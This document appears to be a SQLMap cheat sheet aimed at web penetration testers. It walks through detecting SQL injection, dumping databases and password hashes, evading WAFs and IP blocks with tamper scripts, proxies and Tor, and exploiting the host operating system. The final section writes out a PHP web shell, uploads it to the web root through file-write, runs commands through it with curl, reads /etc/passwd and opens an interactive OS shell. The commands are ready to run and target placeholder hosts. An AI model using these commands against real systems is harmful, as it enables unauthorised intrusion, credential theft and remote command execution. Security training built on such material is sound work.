# Basic usage of SQLMap:


`sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`

Tests if the parameter id is dynamic.


# 🔍 Common Log Messages & Their Meaning:

**"Target URL content is stable"**
Page output doesn’t change between requests — useful for detecting differences caused by SQLi payloads.

**"GET parameter 'id' appears to be dynamic"**
The id parameter changes the page response → good sign it’s linked to a database.

**"Parameter might be injectable"**
Heuristic tests suggest SQLi is possible (e.g., error message from MySQL).

**"Might be vulnerable to XSS"**
Quick check hints the parameter could be vulnerable to XSS (not SQLi-related but helpful info).

**"Back-end DBMS is 'MySQL'"**
SQLMap thinks the database is MySQL. You can skip testing other DBMS types.

**"Include all tests for 'MySQL' extending level/risk values"**
Option to run deeper tests specific to MySQL.

**"Reflective value(s) found and filtering out"**
SQLMap found the payload echoed back in the response — it filters it to avoid false positives.

**"Parameter appears to be injectable"**
SQLMap found a likely injection point using a specific technique (e.g., boolean-based).

**"--string='luther'"**
SQLMap used a known string in the response to detect true vs false conditions.

**"Time-based comparison requires a larger statistical model"**
SQLMap is measuring delays to detect time-based SQLi — needs more samples.

**"Extending UNION query tests"**
Since one technique worked, SQLMap increases test range for UNION injection.

**"'ORDER BY' technique appears to be usable"**
SQLMap uses this to quickly find the correct number of columns.

**"GET parameter 'id' is vulnerable"**
Confirmed SQL injection vulnerability. SQLMap asks if you want to keep testing other parameters.

**"Identified the following injection point(s)"**
Final list of all injection types and payloads that worked — proof of SQLi.

**"Fetched data logged to text files..."**
Output is saved locally in a folder for the target site. You can reuse this for future scans."GET parameter 'id' is vulnerable"


# Running SQLMap on HTTP Requests

**GET and POST Requests**

For GET requests, use `-u` or just include the URL:

`sqlmap 'http://www.example.com/?id=1'`

For POST requests, use `--data`:

`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`

You can test specific parameters by adding `-p`:

`sqlmap ... -p uid`

Or mark them with `*`:

`sqlmap ... --data 'uid=1*&name=test'`

**If the request is complex, copy the entire HTTP request (from Burp Suite or browser dev tools) into a text file, then run:**

`sqlmap -r req.txt`

You can use * in the file to mark where SQLMap should inject, like:

`GET /?id=* HTTP/1.1`


You can add headers or cookies manually:

Using `--cookie`:

`sqlmap ... --cookie='PHPSESSID=abc123'`

Use `--random-agent` to avoid detection by firewalls:

`sqlmap ... --random-agent`

For methods like PUT, use `--method`:

`sqlmap -u target.com --data='id=1' --method PUT`

For JSON or XML data, use `--data` for simple bodies:

`sqlmap -u target.com --data='{"id":1}'`

For complex JSON/XML, use `-r req.txt` with the full request inside the file.

# Tuning in SQLMap


**🔹 Tuning UNION SQLi**

For UNION-based attacks, if SQLMap struggles, help it out:

- `--union-cols=5 → Number of columns in SELECT`
- `--union-char='a' → Filler character (instead of NULL)`
- `--union-from=users → Append a FROM clause to the payload`

**🔹 Payload Structure**

Every SQL injection payload has:

- Vector – the actual SQL code, e.g. UNION SELECT 1,2,version()
- Boundaries – the prefix/suffix used to wrap the vector, e.g. 1')) <vector> -- -

You can manually set them with:

`sqlmap -u "http://example.com/?q=test" --prefix="%'))" --suffix="-- -"`

Useful when the target’s SQL query uses special formatting.

**🔹 Level and Risk**

SQLMap has built-in payloads and boundaries. To expand or narrow them:

- `--level=1-5 → Higher = more payloads (default: 1)`
- `--risk=1-3 → Higher = riskier but more effective tests (default: 1)`

Example:

`sqlmap -u "http://example.com/?id=1" --level=5 --risk=3 -v 3`

Higher values test more types of injections but take longer and may be more dangerous (e.g. modifying data).

**🔹 Forcing Specific SQLi Techniques**

You can limit which SQLi types SQLMap should try:

`--technique=BEU`  # Boolean, Error, Union

Available values:

- B = Boolean-based
- E = Error-based
- U = UNION-based
- T = Time-based
- S = Stacked queries

**🔹 Advanced Tuning Options**

✅ HTTP Response-Based Detection:

SQLMap uses differences in responses to detect injections. You can help it by specifying:

`--code=200` → Focus on responses with HTTP 200
`--string="success"` → Look for this string in true responses
`--titles` → Compare page <title> tags
`--text-only` → Ignore HTML tags and compare visible text only

# Database Enumeration

**Basic Enumeration Example:**

`sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`

`--is-dba` -  whether the current database user has administrative privileges

**📂 Getting Tables from a Database**

`sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`

**📤 Dumping Table Content**

`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb`

**🎯 Filter Specific Columns**

`sqlmap -u "..." --dump -T users -D testdb -C name,surname`

🧠 Useful for big tables—just pull relevant columns.

**🔢 Filter Specific Rows**

`sqlmap -u "..." --dump -T users -D testdb --start=2 --stop=3`

📌 Dumps only 2nd and 3rd rows.

**🔍 Conditional Row Filtering**

`sqlmap -u "..." --dump -T users -D testdb --where="name LIKE 'f%'"`

**🧾 Full Dump**

Dump everything from one DB:

`sqlmap -u "..." --dump -D testdb`

Dump from all DBs (excluding system DBs):

`sqlmap -u "..." --dump-all --exclude-sysdbs`


# 🧠 Advanced Database Enumeration

**🔧 1. View Database Schema (Structure)**

To list all tables and their columns, use:

`sqlmap -u "http://example.com/?id=1" --schema`

**🔍 2. Search for Tables or Columns by Keyword**

🔎 Find tables with "user" in the name:

`sqlmap -u "http://example.com/?id=1" --search -T user`

🔎 Find columns with "pass" in the name:

`sqlmap -u "http://example.com/?id=1" --search -C pass`

**🗂 3. Dump Tables with Passwords**

Once you find a table with passwords, you can dump it:

`sqlmap -u "http://example.com/?id=1" --dump -D master -T users`

If SQLMap detects hashed passwords, it will ask:

"Do you want to crack them?"

✅ You can:

- Use the default dictionary
- Choose your own
- Add suffixes (slow)


**🔐 4. Dump DBMS User Passwords (e.g. root)**

To pull internal DB user accounts and password hashes, run:

`sqlmap -u "http://example.com/?id=1" --passwords --batch`

**💡 Pro Tip: Full Auto Enumeration**

`sqlmap -u "http://example.com/?id=1" --all --batch`

# Bypassing Web Application Protections with SQLMap

**1. CSRF Token Bypass**

Some web apps include CSRF tokens in requests to stop automation. These tokens change with each session or page load.

Use `--csrf-token=token_name` so SQLMap can automatically grab and reuse fresh tokens from responses.

If you forget to specify it, SQLMap may detect tokens (like those with names including csrf, token, or xsrf) and ask to handle them for you.

Example:

`sqlmap -u "http://example.com" --data="id=1&csrf-token=abc123" --csrf-token="csrf-token"`

**2. Unique Value Bypass**

Some apps require a unique value in each request (like a random number). Use `--randomize=param_name` to randomize that parameter every time.

Example:

`sqlmap -u "http://example.com/?id=1&rp=12345" --randomize=rp`

**3. Calculated Parameter Bypass**

Some parameters are derived from others (e.g., a hash of another value). Use `--eval` to run Python code before each request.

Example (hashing id):

`sqlmap -u "http://example.com/?id=1&h=md5hash" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"`

**4. Hiding Your IP**

To avoid IP-based blocking:

- Use a proxy: `--proxy="socks4://IP:PORT"`
- Use multiple proxies from a file: `--proxy-file=proxies.txt`
- Use Tor: `--tor` (make sure Tor is running locally)
- Verify Tor is working: `--check-tor`

**5. WAF Detection and Bypass**
   
SQLMap can detect Web Application Firewalls (WAFs) and try to bypass them:

Skip WAF detection to reduce noise: `--skip-waf`

Use tamper scripts to modify requests and avoid WAF filters.

**6. Changing User-Agent**

Some sites block tools like SQLMap based on the user-agent string. Use `--random-agent` to use a browser-like user-agent.

**7. Tamper Scripts**

These Python scripts change parts of the SQL payload to bypass filters and WAFs.

Example tamper scripts:

`between`: replaces = with BETWEEN and > with NOT BETWEEN
`randomcase`: changes the case of SQL keywords
`space2comment`: replaces spaces with comments (/**/)

Use multiple like this:

`--tamper=between,randomcase`

List all available tamper scripts with:

`--list-tampers`

**8. Miscellaneous Bypasses**

Chunked encoding (`--chunked`): breaks payload into chunks to bypass keyword filters.

HTTP Parameter Pollution (`--hpp`): duplicates parameter names with split payload parts to trick the app into combining them.

Example:

`?id=1&id=UNION&id=SELECT&id=username,id=FROM&id=users`

# 🖥️ OS Exploitation with SQLMap

**🔍 1. Check for DBA Privileges**

Before attempting OS-level actions, check if the current DB user has admin (DBA) privileges:

`sqlmap -u "http://example.com/?id=1" --is-dba`

- True: You have high privileges → can attempt file read/write or command execution.
- False: Your options may be limited.

**📖 2. Read Files from the Server**

If you have enough privileges, you can read local files on the server:

`sqlmap -u "http://example.com/?id=1" --file-read="/etc/passwd"`

The file will be saved locally by SQLMap.

You can then view it using cat.

**✍️ 3. Write Files to the Server**

If the DB allows it, you can upload a file, like a PHP web shell:

Step 1: Create a shell

`echo '<?php system($_GET["cmd"]); ?>' > shell.php`

Step 2: Upload it

`sqlmap -u "http://example.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"`
  
Step 3: Use it

`curl http://example.com/shell.php?cmd=ls`

⚠️ Writing is often disabled by default. You’ll need DBA rights and a writable directory.

**🖥️ 4. Get an Interactive OS Shell**

Instead of manually uploading a shell, let SQLMap do the heavy lifting:

`sqlmap -u "http://example.com/?id=1" --os-shell`

SQLMap will try different techniques (e.g., uploading UDFs or web shells).

You’ll get a basic command shell (like os-shell>) to run system commands.

If no output:

Try a different technique like error-based SQLi:

`sqlmap -u "http://example.com/?id=1" --os-shell --technique=E`
